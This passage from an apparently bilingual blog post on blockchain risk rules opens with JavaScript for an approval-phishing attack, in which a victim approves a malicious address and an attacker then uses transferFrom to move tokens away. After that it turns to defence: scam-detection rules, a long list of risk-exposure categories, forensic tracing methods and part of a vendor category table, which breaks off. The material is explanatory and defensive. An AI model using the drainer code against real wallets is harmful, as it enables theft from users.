tokenContract.methods.approve(maliciousAddress, amount).encodeABI();</span><br><span class="line">        <span class="comment">// 构造交易对象</span></span><br><span class="line">        <span class="keyword">const</span> transactionObject = &#123;</span><br><span class="line">            <span class="keyword">from</span>: victimAddress,</span><br><span class="line">            to: tokenContractAddress,</span><br><span class="line">            data: approveData,</span><br><span class="line">            gas: <span class="number">200000</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 在此处，用户会看到一个请求他们批准授权的弹窗，若用户批准，授权将被执行</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;请在钱包中确认授权交易&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">&#x27;授权交易失败:&#x27;</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">approveMaliciousAddress();</span><br></pre></td></tr></table></figure>
<p><strong>攻击过程</strong><br>一旦授权完成，恶意地址将获得代币转移的权限。诈骗者可以使用transferFrom方法，将受害者的代币转移到自己控制的钱包。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转移代币的代码示例（攻击者执行）</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">transferTokensFromVictim</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> amount = web3.utils.toWei(<span class="string">&#x27;1000&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>); <span class="comment">// 转移数量</span></span><br><span class="line">        <span class="comment">// 调用transferFrom将代币从受害者地址转移到攻击者地址</span></span><br><span class="line">        <span class="keyword">await</span> tokenContract.methods.transferFrom(victimAddress, maliciousAddress, amount).send(&#123; <span class="attr">from</span>: maliciousAddress &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;代币已成功转移到攻击者钱包&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">&#x27;代币转移失败:&#x27;</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>防范措施</strong><br>• <strong>仔细检查授权地址</strong>：用户在确认授权交易时，应该仔细检查授权的地址，确保不是恶意地址。</p>
<p><strong>associated scammer address 关联诈骗者地址</strong><br>Leverage this rule to mitigate interaction with addresses that have received funds from a known scammer.<br>通过此规则，可以减少与曾接收过已知诈骗者资金的地址之间的互动。</p>
<p><strong>scammer deployed contract 诈骗者部署的合约</strong><br>Leverage this rule to mitigate interaction with smart contracts deployed by known scammers. These contracts often promise high returns or false investments but are designed to siphon funds once the victim interacts with them. You can expand this section by discussing how smart contracts are audited (or not) and why code auditing practices could help detect scammer-deployed contracts early.<br>通过此规则，可以减少与已知诈骗者部署的智能合约之间的互动。这些合约通常承诺高回报或虚假投资，但其目的是在受害者与其互动后吸走资金。讨论如何审计智能合约（或不审计）以及为什么代码审计实践可以帮助及早发现诈骗者部署的合约来扩展此部分。</p>
<p><strong>pig butchering 杀猪盘</strong><br>Pig Butchering is a scam that utilizes deceptive communications to manipulate individuals into making fraudulent investments. This behavior identifies addresses that have received transactions suspected to be from Pig Butchering victims. This is accomplished by analyzing historical transactions made by victims of Pig Butchering.<br>杀猪盘是一种利用欺骗性沟通来操控个人进行虚假投资的骗局。该行为识别接收到疑似来自杀猪盘受害者交易的地址。这是通过分析杀猪盘受害者的历史交易实现的。<br>2023年7月，东南亚一个国际诈骗团伙通过社交平台接触受害者，利用情感交流和投资诱惑逐渐获取受害者的信任，随后引导受害者向所谓的“高收益投资项目”转账，实际上这些资金都进入了诈骗者控制的钱包。多个受害者损失金额高达数百万美元。受害者在察觉被骗后报案，但由于资金早已被分散转移至多个国家的加密货币账户，追查和追回难度极大。</p>
<h2 id="Exposure"><a href="#Exposure" class="headerlink" title="Exposure"></a>Exposure</h2><p>Detect exposure to labeled entities using various risk triggers 意思是识别与某些特定类别的实体（如企业、个人或组织）之间的潜在风险关联。<br>系统通过多种风险触发器来检测用户或地址与这些标记的实体之间的交互情况。这些实体通常被标记为与特定的高风险活动相关：</p>
<p><strong>1. Activist Fundraising (政治/社会运动筹款)</strong><br>与政治或社会运动相关的筹款活动，可能涉及高风险或敏感的资金来源，存在被利用进行非法活动的风险。<br>Associated with political or social movement fundraising, potentially involving high-risk or sensitive fund sources, and could be used for illegal activities.</p>
<p><strong>2. ATM (加密货币自动取款机)</strong><br>加密货币ATM允许用户将加密货币兑换成现金或反向操作，因其匿名性和现金交易特性，可能被用于洗钱活动。<br>Cryptocurrency ATMs allow users to convert crypto into cash or vice versa. Due to their anonymity and cash-based transactions, they can be used for money laundering.</p>
<p><strong>3. Authentication (身份认证服务)</strong><br>涉及身份认证服务，可能存在身份欺诈和非法账户访问的风险。<br>Involves identity authentication services, which could carry risks related to identity fraud and unauthorized account access.</p>
<p><strong>4. Bitcoin Faucet (比特币水龙头)</strong><br>提供少量免费比特币的网站，可能被用于隐匿资金来源或洗钱。<br>Websites that distribute small amounts of free Bitcoin, potentially used to obscure the source of funds or launder money.</p>
<p><strong>5. Bridge (跨链桥服务)</strong><br>跨链桥服务用于在不同区块链之间转移资产，可能增加资金追踪的难度。<br>Cross-chain bridges allow asset transfers between different blockchains, which can complicate fund tracing.</p>
<p><strong>6. Broker (经纪商/中介服务)</strong><br>未经许可的金融中介服务，可能涉及非法金融活动或欺诈。<br>Unlicensed financial intermediaries, potentially involved in illegal financial operations or fraud.</p>
<p><strong>7. Charity (慈善机构)</strong><br>某些慈善机构可能被用于洗钱或掩盖非法资金流动。<br>Some charity organizations may be used for money laundering or concealing illegal fund flows.</p>
<p><strong>8. Child Sexual Abuse Material Vendor (儿童性虐待材料供应商)</strong><br>涉及儿童性虐待材料的交易，是严重的非法活动风险指示。<br>Involves the trade of child sexual abuse material (CSAM), a severe indicator of illegal activity.</p>
<p><strong>9. Coin Swap Service (币种兑换服务)</strong><br>币种兑换服务用于将一种加密货币兑换为另一种，可能被用于洗钱或隐藏资金来源。<br>Coin swap services exchange one cryptocurrency for another and may be used for money laundering or hiding the source of funds.</p>
<p><strong>10. Credit Card Data Vendor (信用卡数据供应商)</strong><br>非法出售信用卡数据的服务，常用于网络犯罪和欺诈。<br>Services that illegally sell credit card data, often used in cybercrime and fraud.</p>
<p><strong>11. Criminal Organization (犯罪组织)</strong><br>与已知犯罪组织相关的实体，这些组织涉及洗钱、勒索等非法活动。<br>Entities associated with known criminal organizations involved in activities such as money laundering, extortion, etc.</p>
<p><strong>12. Dark Forum (暗网论坛)</strong><br>暗网上的非法讨论平台，常用于信息交易和非法商品交易。<br>Illicit discussion platforms on the darknet, often used for information exchange and the trade of illegal goods.</p>
<p><strong>13. Dark Market – Centralized (中心化暗网市场)</strong><br>提供非法商品和服务的中心化暗网市场。<br>Centralized darknet markets offering illegal goods and services.</p>
<p><strong>14. Dark Market – Decentralized (去中心化暗网市场)</strong><br>去中心化的非法商品和服务交易市场，难以追踪和关闭。<br>Decentralized marketplaces for trading illegal goods and services, harder to trace and shut down.</p>
<p><strong>15. Dark Service (暗网服务)</strong><br>提供匿名代理、伪造文档等非法服务的平台。<br>Platforms providing illegal services such as anonymous proxy, forged documents, etc.</p>
<p><strong>16. Dark Vendor Shop (暗网供应商店)</strong><br>在暗网市场上设立的供应商店，提供非法商品或服务。<br>Vendor shops on darknet markets providing illegal goods or services.</p>
<p><strong>17. Extortion (勒索)</strong><br>通过威胁或强制手段获取资金，常见于勒索软件攻击中。<br>Obtaining funds through threats or coercion, commonly seen in ransomware attacks.</p>
<p><strong>18. FinCEN Primary Money Laundering Concern (FinCEN主要洗钱关注对象)</strong><br>被美国金融犯罪执法网络（FinCEN）认定为主要洗钱对象。<br>Entities identified by the U.S. FinCEN as primary money laundering concerns.</p>
<p><strong>19. Gambling (赌博)</strong><br>在线赌博服务，可能与资金洗白、欺诈有关。<br>Online gambling services, potentially associated with money laundering or fraud.</p>
<p><strong>20. Known Criminal (已知犯罪分子)</strong><br>已被确认与犯罪行为有关联的实体，涉及欺诈、盗窃等活动。<br>Entities known to be involved in criminal activities such as fraud, theft, etc.</p>
<p><strong>21. Malware (恶意软件)</strong><br>涉及恶意软件的交易，这些软件用于窃取资金或敏感信息。<br>Transactions involving malware used to steal funds or sensitive information.</p>
<p><strong>22. Marijuana Vendor Shop (大麻销售店铺)</strong><br>销售大麻的商店，在一些地区可能非法。<br>Shops selling marijuana, which may be illegal in certain jurisdictions.</p>
<p><strong>23. Mixer (混币服务)</strong><br>混币服务用于混淆加密货币的资金来源，常用于洗钱。<br>Mixing services used to obscure the source of cryptocurrency, often for money laundering.<br><img src="/2024/10/21/Risk-rules-of-public-blockchain/4.png"></p>
<p>What Kind of Service is <strong>CoinJoin</strong>?<br>CoinJoin is a privacy-enhancing Bitcoin transaction which combines inputs from numerous users and returns multiple outputs of identical values. Unlike other mixing services, users maintain custody of their funds throughout this process.<br>The uniformity of outputs is intended to obscure ownership of each UTXO and defeat the heuristic-based clustering algorithms used by law enforcement and blockchain investigators.<br>For example, if four users input 2, 4, 6 and 8 BTC for a total of 20 BTC, the CoinJoin transaction would create 20 separate outputs each worth 1 BTC. The outputs would be apportioned to each user in the same amounts they originally contributed. Since every output has the same value, it should be impossible (in theory) to immediately discern which of the new bitcoin addresses are now controlled by each of the original four users.</p>
<p><strong>24. OFAC Sanctioned Entity (OFAC制裁实体)</strong><br>受到美国外国资产控制办公室（OFAC）制裁的实体。<br>Entities sanctioned by the U.S. Office of Foreign Assets Control (OFAC).</p>
<p><strong>25. Phishing (网络钓鱼)</strong><br>通过欺诈手段获取用户敏感信息（如私钥或登录凭证），常见于网络钓鱼攻击。<br>Fraudulently obtaining sensitive user information (e.g., private keys or login credentials), common in phishing attacks.</p>
<p><strong>26. Ponzi Scheme (庞氏骗局)</strong><br>一种非法的投资骗局，承诺高额回报，但实际上利用新投资者的资金支付旧投资者的收益。<br>An illegal investment scam promising high returns, but actually uses new investors’ funds to pay previous investors.</p>
<p><strong>27. Privacy Wallet (隐私钱包)</strong><br>注重隐私保护的钱包，可能被用于隐藏交易历史或资金流动。e.g., <a href="https://wasabiwallet.io/">Wasabi Wallet</a>。<br>Privacy-focused wallets designed to conceal transaction histories or fund flows. e.g., Wasabi Wallet.</p>
<p><strong>28. Ransomware (勒索软件)</strong><br>勒索软件攻击中使用的地址，受害者需支付赎金解锁被恶意加密的数据。<br>Addresses involved in ransomware attacks, where victims pay ransoms to unlock maliciously encrypted data.</p>
<p><strong>29. Scam (诈骗)</strong><br>涉及诈骗活动的实体或地址，这些地址可能用于网络钓鱼或其他形式的欺诈。<br>Entities or addresses involved in fraudulent activities, often used in phishing or other types of fraud.</p>
<p><strong>30. Shielded (隐私交易)</strong><br>通过隐私保护技术（如零知识证明）隐藏交易信息的工具。<br>Tools that use privacy-enhancing techniques (like zero-knowledge proofs) to hide transaction details.</p>
<p><strong>31. Thief (盗窃)</strong><br>涉及盗窃加密货币的地址，通常通过未经授权的访问或攻击行为。<br>Addresses involved in cryptocurrency theft, typically via unauthorized access or hacking.</p>
<p><strong>32. Terrorist Organization (恐怖组织)</strong><br>涉及恐怖组织的资金流动。<br>Transactions associated with terrorist organizations.</p>
<p><strong>33. Human Trafficking (人口贩运)</strong><br>与人口贩运相关的资金流动。<br>Transactions related to human trafficking activities.</p>
<p><strong>34. Weapon Sales (武器销售)</strong><br>非法武器销售相关的资金流动。<br>Transactions involving the illegal sale of weapons.</p>
<p><strong>35. Drug Trafficking (毒品贩运)</strong><br>与非法毒品交易相关的资金流动。<br>Transactions related to the illegal drug trade.</p>
<p><strong>36. Sanctioned Countries (受制裁国家)</strong><br>与受国际制裁国家的交易，可能违反国际法。<br>Transactions with entities from sanctioned countries, potentially violating international law.</p>
<p><strong>37. Shell Companies (空壳公司)</strong><br>被用于洗钱或隐藏非法资金来源的空壳公司。<br>Shell companies used for money laundering or hiding illegal fund sources.</p>
<p><strong>38. High-Risk Jurisdictions (高风险司法管辖区)</strong><br>与高腐败或监管薄弱的国家或地区的交易，可能增加洗钱风险。<br>Transactions with countries or regions known for weak regulations or high corruption, increasing money laundering risks.</p>
<p><strong>39. Fraudulent ICO (欺诈性ICO)</strong><br>假冒的初始代币发行，承诺高额回报但无实际项目支持。<br>Fake Initial Coin Offerings (ICOs) that promise high returns but have no real project backing.</p>
<p><strong>40. Illegal Content (非法内容)</strong><br>传播或交易非法内容（如盗版、暴力、仇恨言论），这些行为通常违反法律。<br>The distribution or trade of illegal content (e.g., pirated material, violence, hate speech), which typically violates the law.</p>
<p><strong>41. Illicit Marketplace (非法市场)</strong><br>从事非法商品或服务交易的市场，这些市场往往涉及洗钱、毒品或武器交易。<br>Marketplaces that deal in illegal goods or services, often involving money laundering, drug trade, or weapons transactions.</p>
<p><strong>42. Money Mule (资金骡子)</strong><br>通过第三方账户转移非法资金的活动，这些账户通常不知情或自愿参与。<br>Involves the transfer of illicit funds through third-party accounts, where the account holders may be unaware or willingly participate.</p>
<p><strong>43. Ponzi-like Scheme (类庞氏骗局)</strong><br>与庞氏骗局类似的投资骗局，承诺高额回报但实际上以新的投资者资金支付旧投资者的收益。<br>A fraudulent investment operation similar to a Ponzi scheme, promising high returns while using new investors’ money to pay earlier investors.</p>
<p><strong>44. Privacy Coin (隐私币)</strong><br>设计用于隐藏交易细节的加密货币，虽然保护用户隐私，但也可能被用于非法活动。<br>Cryptocurrencies designed to conceal transaction details, while enhancing user privacy, may also be used for illicit activities.</p>
<p><strong>45. Ransomware Payment (勒索软件支付)</strong><br>向勒索软件攻击者支付赎金的交易，用以解锁被恶意加密的数据。<br>Transactions made to ransomware attackers to unlock maliciously encrypted data.</p>
<p><strong>46. Sanctioned Individual (受制裁个人)</strong><br>与受国际或政府制裁的个人进行交易，可能违反制裁法律。<br>Transactions with individuals under international or government sanctions, potentially violating sanction laws.</p>
<p><strong>47. Suspicious Transaction (可疑交易)</strong><br>异常或可疑的交易行为，可能与洗钱、欺诈或其他非法活动相关。<br>Transactions that appear abnormal or suspicious, potentially linked to money laundering, fraud, or other illicit activities.</p>
<p><strong>48. Terrorist Financing (恐怖主义融资)</strong><br>为恐怖组织提供资金的行为，通常通过加密货币隐秘进行。<br>The act of providing financial support to terrorist organizations, often facilitated covertly through cryptocurrency.</p>
<p><strong>49. Unlicensed Money Service Business (无牌照货币服务业务)</strong><br>未经许可的货币兑换或转账服务，可能涉及洗钱或非法金融活动。<br>Unlicensed currency exchange or transfer services, potentially involved in money laundering or illegal financial activities.</p>
<p><strong>50. Whale Transaction (巨鲸交易)</strong><br>涉及大量加密货币交易，可能引起市场波动或被用于非法资金转移。<br>Transactions involving large amounts of cryptocurrency, potentially affecting market stability or used for illicit fund transfers.</p>
<p><strong>51. Front-Running (抢跑交易)</strong><br>涉及利用未公开的市场信息，在合法交易被确认之前抢先执行交易，导致市场操纵或不公平的交易环境。<br>Front-running involves using non-public market information to execute trades before legitimate trades are confirmed, leading to market manipulation or unfair practices.</p>
<p><strong>52. Pump-and-Dump (拉高出货)</strong><br>一种市场操纵手段，操纵者人为抬高加密货币的价格，吸引散户投资者购买，随后抛售手中的大量持仓。<br>A form of market manipulation where perpetrators artificially inflate the price of a cryptocurrency to attract retail investors, then sell off their large holdings.</p>
<p><strong>53. Wash Trading (刷单交易)</strong><br>交易者通过自己在不同账户间反复买卖相同资产，制造虚假交易量，操纵市场价格。<br>Traders repeatedly buy and sell the same asset between their own accounts, creating fake trading volume to manipulate market prices.</p>
<p><strong>54. Regulatory Arbitrage (监管套利)</strong><br>利用不同司法管辖区的监管差异，通过选择监管较宽松的地区进行交易，规避合规要求。<br>Taking advantage of regulatory differences across jurisdictions by trading in regions with looser regulations to avoid compliance requirements.</p>
<p>=============== the risks below are not in the list of <strong>Elliptic and TRMLAB</strong> ===============<br>================= 以下风险没有包含在 <strong>Elliptic and TRMLAB</strong> 的范围内 =================</p>
<p><strong>55. Fake News Manipulation (假新闻操纵)</strong><br>散布虚假消息，影响市场情绪和资产价格，从中获利或导致市场动荡。<br>Spreading false information to manipulate market sentiment and asset prices, either for profit or to destabilize the market.</p>
<p><strong>56. Tax Evasion (逃税)</strong><br>使用加密资产来隐瞒收入，逃避税收，特别是在多个国家拥有资产的情况下。<br>Using cryptocurrencies to hide income and evade taxes, especially when assets are held across multiple countries.</p>
<p><strong>57. Insider Trading (内幕交易)</strong><br>未公开的内部信息被用于个人利益相关的交易，可能违反证券法。<br>Using non-public insider information for personal gain in trading, potentially violating securities laws.</p>
<p><strong>58. Peer-to-Peer (P2P) Market Risks (点对点市场风险)</strong><br>在P2P交易市场上，用户可以绕过银行或正规金融机构进行交易，增加欺诈或非法交易的风险。<br>On peer-to-peer markets, users can bypass banks or formal financial institutions, increasing the risk of fraud or illicit transactions.</p>
<p><strong>59. Layer 2 Protocol Risks (Layer 2协议风险)</strong><br>涉及Layer 2扩展方案的风险，这些方案用于提高区块链交易的可扩展性，但可能缺乏充分的安全性或合规措施。<br>Risks related to Layer 2 scaling solutions, which aim to improve blockchain transaction scalability but may lack robust security or compliance measures.</p>
<p><strong>60. Flash Loan Exploits (闪电贷攻击)</strong><br>使用无抵押的闪电贷款，在单个交易中操纵市场或智能合约，进行非法获利。<br>Using uncollateralized flash loans to manipulate the market or smart contracts within a single transaction for illicit profit.</p>
<p><strong>61. Smart Contract Exploits (智能合约漏洞利用)</strong><br>利用智能合约中的漏洞或缺陷，执行未授权的资金转移或操纵合约行为。<br>Exploiting vulnerabilities or flaws in smart contracts to carry out unauthorized fund transfers or manipulate contract behavior.</p>
<p><strong>62. NFT Fraud (NFT欺诈)</strong><br>与非同质化代币(NFT)相关的欺诈行为，包括伪造稀有资产、洗钱或欺骗性交易。<br>Fraud involving Non-Fungible Tokens (NFTs), including forgery of rare assets, money laundering, or deceptive transactions.</p>
<p><strong>63. Liquidity Pool Exploitation (流动性池利用)</strong><br>通过操纵流动性池的算法或规则非法获利，导致投资者或交易者损失。<br>Illegally profiting by manipulating the algorithms or rules governing liquidity pools, causing losses to investors or traders.</p>
<p><strong>64. DeFi Protocol Risks (去中心化金融协议风险)</strong><br>去中心化金融(DeFi)平台的风险，包括智能合约漏洞、治理攻击、流动性枯竭等。<br>Risks associated with decentralized finance (DeFi) platforms, including smart contract vulnerabilities, governance attacks, and liquidity exhaustion.</p>
<p><strong>65. Unregulated Stablecoins (无监管稳定币)</strong><br>某些稳定币未受监管，可能在破产、赎回失败或资产透明性不足的情况下带来系统性风险。<br>Some stablecoins are unregulated, potentially posing systemic risks in the event of insolvency, redemption failures, or lack of transparency.</p>
<h2 id="What-Kind-of-Information-Can-be-Traced"><a href="#What-Kind-of-Information-Can-be-Traced" class="headerlink" title="What Kind of Information Can be Traced?"></a>What Kind of Information Can be Traced?</h2><p>The twin goals of cryptocurrency forensics and asset tracing — identify the perpetrator, and find their funds — are pursued through several areas of analysis and fact-finding:</p>
<ol>
<li><p><strong>Attribution Data</strong>: Blockchain intelligence tools collect and analyze ownership attribution information for thousands of entities, which can be used to de-anonymize blockchain addresses for identification of criminals and investigative subjects. These systems rarely provide personally identifying information (PII) for individual owners of specific cryptocurrency assets, but may identify known associations with criminal groups or fraud schemes, as well as transactions with other relevant entities, such as exchanges and fiat off-ramps where criminal proceeds are converted to cash.</p>
</li>
<li><p><strong>Transaction Mapping</strong>: Transactional data is converted into visual maps and flowcharts, showing interactions by the subject with known exchanges and other entities, tracing financial transfers to their ultimate endpoints. Visual mapping makes it much easier to recognize patterns, such as layering and peel chains, commonly used for money laundering. Expert investigators use powerful tools that automate mapping and evidence collection. This approach is more efficient and more effective than blockchain search engines or open-source explorers that require manual review of ledger entries.</p>
</li>
<li><p><strong>Cluster Analysis</strong>: A cluster is a group of cryptocurrency addresses that are controlled by the same person or entity. Expanding the focus of an investigation from one address to a larger cluster can dramatically increase the amount of available evidence for de-anonymization and asset tracing. Cluster analysis can also be used to determine if any linked addresses have a substantial current value or UTXO.</p>
</li>
<li><p><strong>Subpoena Targets</strong>: Commercial cryptocurrency exchanges, decentralized finance (DeFi) firms, and virtual asset service providers that comply with Know Your Customer (KYC) and Anti-Money Laundering (AML) regulations typically require verification of customer identity for new accounts. This makes them a highly valuable resource for de-anonymizing subjects who have used their services to buy, trade, hold, or cash-out cryptocurrency. Personally identifying information for registered owners of addresses and wallets – as well as their banking details – may be obtainable through civil subpoenas or criminal warrants.</p>
</li>
<li><p><strong>Current/Historical Value</strong>: Cryptocurrency addresses with significant value are critical indicators for financial recovery. They may be appropriate targets for seizure warrants by criminal prosecutors, or garnishment during civil judgment enforcement.</p>
</li>
<li><p><strong>Total Transactions</strong>: Volume of cryptocurrency transactions can signify the potential size of a fraud scheme and number of victims. Complaints to law enforcement typically receive more attention when a crime syndicate has harmed numerous people. Larger schemes may also be appropriate for class action suits in civil court.</p>
</li>
<li><p><strong>Risk Profiling</strong>: Automated risk-scoring is conducted through advanced algorithms that trace activity of target address(es) and identify associations with known entities such as exchanges, mixers, peer-to-peer exchanges, sanctioned parties, ransomware rings, and darknet markets.</p>
</li>
<li><p><strong>IP Address</strong>: Privacy-piercing metadata is collected through blockchain surveillance systems, which run networks of nodes that “listen” and “sniff” for Internet Protocol (IP) addresses associated with certain transactions. IP addresses, when available, may provide information regarding the geographical location of the subject at the time of the transaction.</p>
</li>
</ol>
<h2 id="How-to-create-a-Finance-business-Risk-Rule"><a href="#How-to-create-a-Finance-business-Risk-Rule" class="headerlink" title="How to create a Finance business Risk Rule?"></a>How to create a Finance business Risk Rule?</h2><p>Combination of the risk rules as a business rules as below:<br><img src="/2024/10/21/Risk-rules-of-public-blockchain/5.png"></p>
<h2 id="Rules-as-best-example-Elliptic"><a href="#Rules-as-best-example-Elliptic" class="headerlink" title="Rules as best example (Elliptic)"></a>Rules as best example (Elliptic)</h2><table>
<thead>
<tr>
<th><strong>Category</strong></th>
<th><strong>Description</strong></th>
<th><strong>Example</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Activist Fundraising</strong></td>
<td>Entities that have (a) either been convicted of a crime directly related to extremist activity or (b) have been identified and verified to have incited prejudice, violence and/or serious crimes. Elliptic maintains a rigorous and objective internal process when determining whether an entity should be ascribed to this label, based on the above conditions.</td>
<td>Pankkake (Anonymous Far Right Donor)</td>
</tr>
<tr>
<td><strong>ATM</strong></td>
<td>An automated teller machine at which cryptoassets can be sold and purchased for fiat currency; similar to a traditional bank-operated ATM.</td>
<td>ATM brands include SatoshiPoint, Lamassu, GenesisCoin</td>
</tr>
<tr>
<td><strong>Authentication</strong></td>
<td>A service that allows users to prove their unique identity without having to enter in their login credentials when accessing a particular website, thus increasing security.</td>
<td>Civic</td>
</tr>
<tr>
<td><strong>Bitcoin Faucet</strong></td>
<td>A type of website that at one time gave away Bitcoin for free. Now these websites usually reward users in the form of Bitcoin for completing tasks such as captchas.</td>
<td>Moonbit</td>
</tr>
<tr>
<td><strong>Blockchain</strong></td>
<td>Addresses linked to the operation of the blockchain.</td>
<td>TON Foundation</td>
</tr>
<tr>
<td><strong>Bridge</strong></td>
<td>A contract or service used to transfer assets from one blockchain to another.</td>
<td>Ren</td>
</tr>
<tr>
<td><strong>Broker</strong></td>
<td>An entity involved in the buying and selling of cryptoassets on behalf of clients.  <br>​  <br>Unlike an exchange, a broker does not have an order book.</td>
<td>Cumberland Mining</td>
</tr>
<tr>
<td><strong>Charity</strong></td>
<td>A non-profit or charitable organisation that accepts Bitcoin donations.</td>
<td>US Luge Foundation</td>
</tr>
<tr>
<td><strong>Child Sexual Abuse Material Vendor</strong></td>
<td>A vendor offering Child Sexual Abuse imagery for cryptoasset payment.</td>
<td></td>
</tr>
<tr>
<td><strong>Coin Swap Service</strong></td>
<td>A crypto-to-crypto conversion service with fixed exchange rates that does often not require a user to login or any KYC.</td>
<td>ChangeNOW</td>
</tr>
<tr>
<td><strong>Credit Card Data Vendor</strong></td>
<td>An online carding shop, providing illicit credentials and other illicit personal financial information.</td>
<td>JokerStash.store</td>
</tr>
<tr>
<td><strong>Criminal Organisation</strong></td>
<td>A group of multiple individuals involved in organised crime.</td>
<td>The Shadow Brokers</td>
</tr>
<tr>
<td><strong>Crypto-Exchange</strong></td>
<td>An exchange where customers can only trade cryptoassets in exchange for other cryptoassets.</td>
<td>Poloniex</td>
</tr>
<tr>
<td><strong>Dark Forum</strong></td>
<td>A TOR-only accessible online discussion forum</td>
<td>DNM Avengers</td>
</tr>
<tr>
<td><strong>Dark Market - Centralised</strong></td>
<td>A TOR-only accessible marketplace selling illegal goods and services with a centralised infrastructure.  <br>​  <br>The marketplace has its own wallet infrastructure and holds users keys on it.  <br>​  <br>Individuals making and receiving purchases interact with the marketplace, rather than with the seller or buyer directly.</td>
<td>Dream Market</td>
</tr>
<tr>
<td><strong>Dark Market - Decentralised  <br>​</strong></td>
<td>A TOR-only accessible marketplace selling illegal goods and services with a decentralised infrastructure.  <br>​  <br>The marketplace does not have its own wallet infrastructure.  <br>​  <br>Individuals making and receiving purchases interact directly with the seller or buyer.</td>
<td>Wall Street Market</td>
</tr>
<tr>
<td><strong>Dark Service</strong></td>
<td>An illicit service, including hacking, wallet, and web hosting services.</td>
<td>PinPays</td>
</tr>
<tr>
<td><strong>Dark Vendor Shop</strong></td>
<td>A TOR-only accessible individual vendor shop on a dark marketplace that sells illegal goods and services.</td>
<td>Euroarms</td>
</tr>
<tr>
<td><strong>Data</strong></td>
<td>A vendor that provides data for the end user, such as details regarding the bitcoin address owner, such as username and email address.</td>
<td>BitcoinWhosWho</td>
</tr>
<tr>
<td><strong>De-Fi</strong></td>
<td>A decentralised financial platform, usually run through a smart contract.</td>
<td>MakerDAO</td>
</tr>
<tr>
<td><strong>Decentralised Exchange</strong></td>
<td>A decentralised service that provides crypto-to-crypto exchange services, such as Bitcoin to Ethereum.</td>
<td>Uniswap</td>
</tr>
<tr>
<td><strong>Entertainment</strong></td>
<td>A vendor that provides streaming, TV, films, and other entertainment services.</td>
<td></td>
</tr>
<tr>
<td><strong>Escrow</strong></td>
<td>A vendor that provides escrow services for a transaction between two parties.</td>
<td>Safe Lock</td>
</tr>
<tr>
<td><strong>Exchange</strong></td>
<td>A centralised service that provides fiat-to-crypto exchange services, such as USD to bitcoin.  <br>​  <br>The exchange may also provide crypto-to-crypto exchanges services, such as Bitcoin to Ethereum.</td>
<td>Coinbase</td>
</tr>
<tr>
<td><strong>Extortion</strong></td>
<td>The use of force or threats to obtain funds from an individual or multiple individuals.</td>
<td>Ashley Madison Extortion</td>
</tr>
<tr>
<td><strong>Financial Services</strong></td>
<td>A financial services organisation providing financial services, such as loans, bonds, and derivatives products.</td>
<td>Bitbond</td>
</tr>
<tr>
<td><strong>FinCEN Primary Money Laundering Concern</strong></td>
<td>FinCEN uses this designation when it has identified a financial institution, jurisdiction, or type of account as being of significant risk for money laundering or the financing of terrorism.</td>
<td>Bitzlato - FINCEN Section 9714 - January 18 2023</td>
</tr>
<tr>
<td><strong>Forum</strong></td>
<td>An online discussion forum.</td>
<td>Reddit</td>
</tr>
<tr>
<td><strong>Gambling</strong></td>
<td>Gambling services.</td>
<td>BetChain</td>
</tr>
<tr>
<td><strong>Hardware Wallet</strong></td>
<td>A physical hardware wallet to store cryptoassets; located often on a separate external hard drive with the purpose of providing additional wallet security.</td>
<td>Bitcoin Paper Wallet</td>
</tr>
<tr>
<td><strong>High Transaction Fee</strong></td>
<td>A transaction involving a higher than average transaction fee to miners, suggesting possible loss or criminal activity.</td>
<td>High Transaction Fee Sender (Block 7238273)</td>
</tr>
<tr>
<td><strong>Hosting</strong></td>
<td>Website hosting service.</td>
<td><a href="http://torservers.net/">Torservers.net</a></td>
</tr>
<tr>
<td><strong>Investment Syndicate</strong></td>
<td>A group investment provider, such as a cryptoasset venture operator or multi-level marketing scheme.</td>
<td>Coinsilium</td>
</tr>
<tr>
<td><strong>Known Criminal</strong></td>
<td>A Known Criminal is a known individual involved in illicit activity. A Known Criminal is often linked to a Criminal Organisation.</td>
<td>Ross Ulbricht and Carl Mark Force</td>
</tr>
<tr>
<td><strong>Law Enforcement</strong></td>
<td>A known law enforcement entity.</td>
<td>FBI</td>
</tr>
<tr>
<td><strong>Layer 2</strong></td>
<td>A blockchain scaling solution built on a “Layer 1” blockchain, typically enabling faster transactions with lower fees, while retaining the security of the Layer 1 protocol.</td>
<td>Lightning Network</td>
</tr>
<tr>
<td><strong>Malware</strong></td>
<td>Software that is intended to damage or disable computers and computer systems.</td>
<td>Trickbot</td>
</tr>
<tr>
<td><strong>Marijuana Vendor Shop</strong></td>
<td>A marijuana dispensary, registered in a regulated jurisdiction.</td>
<td>Speedweed</td>
</tr>
<tr>
<td><strong>Merchant</strong></td>
<td>Online licit merchants or vendors.</td>
<td>Mypayingcryptoads</td>
</tr>
<tr>
<td><strong>Microtransactions Service</strong></td>
<td>Website promoting microtransactions, for example freelance work, web plugins generating cryptoassets.</td>
<td>coinworker</td>
</tr>
<tr>
<td><strong>Mine</strong></td>
<td>Newly minted cryptoassets which are created as part of the mining/validating process.</td>
<td>The bitcoin which is paid to miners as the block reward and transaction fees</td>
</tr>
<tr>
<td><strong>Miner</strong></td>
<td>A service that mines and generates new cryptoassets.</td>
<td>BTC.TOP</td>
</tr>
<tr>
<td><strong>Misc Service</strong></td>
<td>A miscellaneous uncategorized service, vendor, or organisation.</td>
<td>Coinfirm</td>
</tr>
<tr>
<td><strong>Mixer</strong></td>
<td>A service that allows for cryptoassets mixing or tumbling in order to anonymise funds. Used for both privacy purposes and also for laundering funds.</td>
<td>Chip Mixer</td>
</tr>
<tr>
